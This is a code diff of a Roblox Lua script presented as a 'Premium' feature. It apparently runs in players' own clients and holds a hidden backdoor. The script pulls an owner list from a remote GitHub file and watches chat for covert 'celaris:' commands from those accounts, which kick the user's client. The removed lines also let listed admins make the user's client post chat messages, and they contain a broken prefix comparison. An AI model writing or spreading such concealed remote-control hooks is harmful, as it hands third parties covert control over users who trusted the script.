@@ -11,102 +11,64 @@ end
 -- // Celaris Premium (New Feature)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local HttpService = game:GetService("HttpService")
-local StarterGui = game:GetService("StarterGui")
-
 local LocalPlayer = Players.LocalPlayer
 
--- Static regular admins (can only talk)
-local regularAdmins = {
-    ["x8lx8x"] = true,
-    ["xleskyy"] = true,
-}
+local ChatEvent = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
 
--- Will be filled from GitHub
-local fullAdmins = {}
+-- Admin check
+local HttpService = game:GetService("HttpService")
+local function getOwners()
+	local success, result = pcall(function()
+		return HttpService:GetAsync("https://raw.githubusercontent.com/exlehskee/808s/refs/heads/main/AdminAllowed")
+	end)
+	if success then
+		return result:split("\n")
+	end
+	return {}
+end
 
--- Fetch GitHub full admin list
-task.spawn(function()
-    local success, response = pcall(function()
-        return HttpService:GetAsync("https://raw.githubusercontent.com/exlehskee/808s/refs/heads/main/AdminAllowed")
-    end)
-    if success and response then
-        for _, line in ipairs(response:split("\n")) do
-            local trimmed = line:match("^%s*(.-)%s*$")
-            if trimmed and trimmed ~= "" then
-                fullAdmins[trimmed:lower()] = true
-            end
-        end
-    else
-        warn("Failed to fetch full admin list.")
-    end
+local function isOwner(user)
+	local list = getOwners()
+	for _, v in pairs(list) do
+		if v:lower() == user:lower() then
+			return true
+		end
+	end
+	return false
+end
+
+-- Find player from name fragment
+local function findPlayer(str)
+	str = str:lower()
+	for _, plr in ipairs(Players:GetPlayers()) do
+		if plr ~= LocalPlayer and (plr.Name:lower():find(str) or plr.DisplayName:lower():find(str)) then
+			return plr
+		end
+	end
+	return nil
+end
+
+-- Listen for hidden admin messages
+ChatEvent.OnClientEvent:Connect(function(msgData)
+	local speaker = msgData.FromSpeaker
+	local message = msgData.Message
+
+	if not isOwner(speaker) then return end
+	if not message:lower():match("^celaris:") then return end
+
+	local cmd = message:sub(9) -- remove "celaris:"
+
+	if cmd == "kickall" then
+		LocalPlayer:Kick("Celaris | Admin removed you.")
+	elseif cmd:sub(1, 4) == "kick" then
+		local arg = cmd:sub(6)
+		local plr = findPlayer(arg)
+		if plr and plr == LocalPlayer then
+			LocalPlayer:Kick("Celaris | Admin removed you.")
+		end
+	end
 end)
 
--- Utility: is full admin
-local function isFullAdmin(name)
-    return fullAdmins[name:lower()] == true
-end
-
--- Utility: is regular admin
-local function isRegularAdmin(name)
-    return regularAdmins[name:lower()] == true
-end
-
--- Utility: find matching player
-local function findPlayer(nameFragment)
-    nameFragment = nameFragment:lower()
-    for _, player in ipairs(Players:GetPlayers()) do
-        local uname = player.Name:lower()
-        local dname = player.DisplayName:lower()
-        if uname == nameFragment or dname == nameFragment or uname:find(nameFragment) or dname:find(nameFragment) then
-            return player
-        end
-    end
-    return nil
-end
-
--- Handle command messages
-local function handleCommand(msg, senderName)
-    msg = msg:lower()
-    if not (isFullAdmin(senderName) or isRegularAdmin(senderName)) then return end
-
-    if msg:sub(1, 5) == "/e :kick" or msg:sub(1, 6) == ":kick " then
-        local targetName = msg:match(":kick%s+(.+)")
-        if targetName then
-            local matched = findPlayer(targetName)
-            if matched and matched ~= LocalPlayer then
-                LocalPlayer:Kick("Celaris | A Premium Member/Moderator has kicked you from the server")
-            end
-        end
-
-    elseif msg == "/e :kickall" or msg == ":kickall" then
-        if isFullAdmin(senderName) then
-            LocalPlayer:Kick("Celaris | Kicked by full admin via :kickall")
-        end
-
-    elseif msg:sub(1, 6) == ":talk " or msg:sub(1, 7) == "/e :talk" then
-        local text = msg:match(":talk%s+(.+)")
-        if text and senderName ~= LocalPlayer.Name then
-            local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-            if chatRemote and chatRemote:FindFirstChild("SayMessageRequest") then
-                chatRemote.SayMessageRequest:FireServer(text, "All")
-            end
-        end
-    end
-end
-
--- Listen to all players chatting
-local function connectPlayer(plr)
-    plr.Chatted:Connect(function(msg)
-        handleCommand(msg, plr.Name)
-    end)
-end
-
-for _, plr in ipairs(Players:GetPlayers()) do
-    connectPlayer(plr)
-end
-
-Players.PlayerAdded:Connect(connectPlayer)
 
 
 
